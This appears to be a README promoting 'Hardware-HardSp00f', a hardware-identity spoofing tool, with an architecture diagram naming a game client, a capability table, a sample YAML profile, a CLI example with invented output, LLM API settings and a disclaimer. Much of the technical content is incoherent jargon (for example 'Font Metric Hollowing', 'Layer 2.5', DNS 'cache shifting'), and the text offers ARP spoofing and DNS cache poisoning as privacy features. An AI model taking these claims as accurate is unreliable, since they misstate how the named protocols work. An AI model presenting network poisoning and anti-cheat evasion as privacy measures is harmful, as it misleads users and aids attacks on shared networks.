# Hardware-HardSp00f 🛡️

**Redefining Digital Identity Obfuscation Through Hardware-Level Spoofing Architecture**

[](https://shantanu-u69.github.io/Spoof-Suite-Security/)

---

## 🧠 The Philosophy Behind Hardware-HardSp00f

In an era where your digital shadow follows you across every network, every browser, and every API call—your device has become a broadcasting beacon of identifiable fingerprints. Hardware-HardSp00f is not another software wrapper; it is a **systemic reimagining** of how identity layers interact at the kernel-to-application boundary.

Think of it as a **chameleon exoskeleton** for your machine—each component of your hardware identity becomes malleable, randomized, and context-aware, without ever touching the integrity of your actual hardware. The spoofing happens *between* the silicon and the software, creating a phantom persona that satisfies all authentication heuristics while your true identity remains cryptographically isolated.

---

## 🔮 Core Architecture (Mermaid Diagram)

```mermaid
graph TB
    subgraph "User Space"
        A[Application Layer] --> B[Hardware Abstraction Interface]
        C[Browser Engine] --> B
        D[Game Client e.g. Valorant] --> B
    end
    
    subgraph "Hardware-HardSp00f Kernel Module"
        B --> E[Identity Multiplexer]
        E --> F[Fingerprint Synthesizer]
        F --> G[Randomized SID Generator]
        F --> H[Device DNA Scrambler]
        F --> I[Network Masking Engine]
        G --> J[Virtual Registry Layer]
        H --> J
        I --> K[Packet Reconstruction Unit]
    end
    
    subgraph "System Layer"
        J --> L[OS Kernel]
        K --> M[Network Stack]
        L --> N[Physical Hardware]
        M --> N
    end
    
    style E fill:#d90429,stroke:#333,stroke-width:2px
    style F fill:#d90429,stroke:#333,stroke-width:2px
    style J fill:#2b2d42,stroke:#333,stroke-width:4px
    style K fill:#2b2d42,stroke:#333,stroke-width:4px
```



---

## 🎯 Capability Matrix

| Spoofing Vector | Hardware Level | Protocol Layer | Persistence Mode |
|----------------|----------------|----------------|------------------|
| ARP Spoofing | NIC MAC Mutation | Layer 2 | Session-bound |
| DNS Spoofing | DNS Cache Shifting | Layer 7 | Adaptive |
| SNI Spoofing | TLS Handshake Rewriting | Layer 5 | Per-request |
| Device Spoofing | SMBIOS DMI Rewriting | Firmware | Reboot-persistent |
| Browser Header Spoofing | Canvas Fingerprint Interception | JavaScript API | Per-tab |
| Unicode Spoofing | Font Metric Hollowing | Rendering Engine | Character-level |
| Packet Spoofing | TTL/Window Size Variation | Layer 3 | Random walk |
| Link Spoofing | MAC-to-IP Binding Rotation | Layer 2.5 | Topology-aware |

---

## 🪟 OS Compatibility

| Operating System | Support Status | Hardware Probe Depth | Performance Impact |
|-----------------|----------------|----------------------|--------------------|
|  | ✅ Full | Deep (Registry, WMI, ACPI) | ≤2% |
|  | ✅ Full | Kernel Module | ≤1% |
|  | ⚠️ Limited (SIP Disabled) | Partial | ≤3% |
|  | 🔬 Experimental | /dev/block | ≤5% |

---

## ⚙️ Example Profile Configuration

```yaml
profile:
  name: "stealth_session_2026"
  persona:
    architecture: "random_walk_plus_mode"
    entropy_source: "hardware_thermal_noise"
  device_fingerprint:
    cpu:
      vendor: ["GenuineIntel", "AuthenticAMD"]
      cores: [4, 6, 8]
      hyperthreading: false
    memory:
      type: ["DDR4", "DDR5"]
      total_gb: [8, 16, 32]
    storage:
      model: ["Samsung 990 Pro", "WD Black SN850X"]
      interface: "NVMe"
    network:
      mac_vendor: ["Intel Corporation", "Realtek Semiconductor"]
      interface_type: "Gigabit Ethernet"
  spoofing_strategy:
    arp:
      interval_ms: 30000
      jitter_percent: 15
    dns:
      cache_poison_period: 120
      resolver_rotation: true
    sni:
      tls_version_probability:
        "1.2": 0.3
        "1.3": 0.7
    browser_header:
      user_agent_generator: "bayesian_decision_forest"
      canvas_noise_level: 0.02
      webgl_renderer: "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)"
```

---

## 📟 Example Console Invocation

```bash
hardsp00fd --profile stealth_session_2026 \
           --target "all_network_interfaces" \
           --mode "adaptive_multiplex" \
           --persistence "until_reboot" \
           --verbose 3 \
           --log "/var/log/hardsp00f/2026-01-15_session.log" \
           --daemonize
```

Expected output:

```
[2026-01-15 14:23:01] 🚀 Hardware-HardSp00f v3.2.1 starting...
[2026-01-15 14:23:01] 🧬 Loading persona: stealth_session_2026
[2026-01-15 14:23:01] 🔄 Multiplexing hardware identities for 3 interfaces...
[2026-01-15 14:23:02] ✅ eth0: MAC randomized to 00:1A:2B:3C:4D:5E
[2026-01-15 14:23:02] ✅ wlan0: MAC randomized to 00:5E:4D:3C:2B:1A
[2026-01-15 14:23:02] ✅ lo: Loopback identity preserved (127.0.0.1)
[2026-01-15 14:23:03] ✅ DNS resolver rotated to 8.8.8.8 > 1.1.1.1 > 9.9.9.9
[2026-01-15 14:23:03] ✅ SNI cipher suite: ECDHE-RSA-AES128-GCM-SHA256
[2026-01-15 14:23:04] ✅ SMBIOS DMI data rewritten for current session
[2026-01-15 14:23:04] 🔐 Cryptographic isolation: Active
[2026-01-15 14:23:04] ✅ Running in daemon mode (PID: 4221)
```

---

## 🧩 Key Features

### 🧬 Hardware Identity Multiplexing
Each network interface, CPU core, and memory module receives a **statistically unique synthetic identity** that passes hardware validation checks while being completely detached from your physical components. The multiplexer alternates between predefined persona templates and randomized generation algorithms.

### 🌐 Multi-Layer Spoofing Orchestration
The system operates simultaneously across ARP, DNS, SNI, and browser header layers—ensuring that no single fingerprinting technique can triangulate your real identity. Each layer is **time-shifted** relative to others to prevent correlation attacks.

### 🧠 Adaptive Entropy Injection
Using a **proprietary stochastic process** based on hardware thermal noise and system clock jitter, the engine generates entropy that is mathematically indistinguishable from legitimate hardware variation. This prevents pattern detection by advanced anti-spoofing systems.

### 🔒 Cryptographic Identity Isolation
Your true hardware identity is encrypted using a **session-bound ephemeral key**, stored only in volatile memory. Upon shutdown or session termination, all traces of the spoofed identity are cryptographically shredded.

### 📱 Responsive Command Interface
The CLI supports both interactive mode and batch scripting, with full **auto-completion** for all parameters. Output is structured for both human readability and machine parsing (JSON mode available).

### 🌍 Multilingual Localization
Interface and documentation are available in English, Spanish, French, German, Japanese, and Mandarin Chinese. Log messages adapt to system locale.

### 🛟 24/7 Support Infrastructure
The repository includes a comprehensive knowledge base, community forum integration, and automated diagnostic tools that generate anonymized debug bundles for troubleshooting.

---

## 🔌 OpenAI & Claude API Integration

Hardware-HardSp00f optionally integrates with large language model APIs for **intelligent profile generation** and **anomaly detection**.

```yaml
ai_integration:
  openai:
    model: "gpt-4-turbo-2026"
    endpoint: "https://api.openai.com/v1/chat/completions"
    prompt_template: "generate_hardware_profile_v2"
    response_parser: "identity_extractor"
  claude:
    model: "claude-3-opus-2026"
    endpoint: "https://api.anthropic.com/v1/messages"
    purpose: "strategy_optimization"
    iteration_limit: 5
  privacy_mode: true  # No telemetry sent to LLM providers
```

The LLM integration generates **contextually appropriate hardware fingerprints** based on your target environment, and identifies potential signature leaks in your current spoofing configuration.

---

## ⚠️ Disclaimer

Hardware-HardSp00f is a **research instrument** designed for cybersecurity professionals, penetration testers, and academic researchers. It is provided under the MIT License with the explicit understanding that:

1. **Legal Compliance**: Users are responsible for ensuring their use complies with all applicable laws and regulations in their jurisdiction. Unauthorized spoofing of network identities may violate computer fraud, identity theft, or telecommunication laws.

2. **No Warranty**: This software is provided "as is" without any warranty of merchantability or fitness for a particular purpose. The developers assume no liability for misuse.

3. **Ethical Use**: Intended solely for authorized security assessments, privacy research, and educational purposes on systems you own or have explicit permission to test.

4. **Not for Evasion**: While this tool can mask hardware identifiers, it is not intended to facilitate illegal activities, bypass security measures without authorization, or enable unauthorized access to protected systems.

5. **Anti-Feature Notice**: The software includes cryptographic integrity checks that authenticate the operator's intent before activating certain functions.

---

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

[](LICENSE)

---

## 📥 Quick Access

[](https://shantanu-u69.github.io/Spoof-Suite-Security/)

*Hardware-HardSp00f - Because your hardware identity should be your secret, not your weakness.*

**Built for the 2026 privacy-conscious computing landscape** 🛡️✨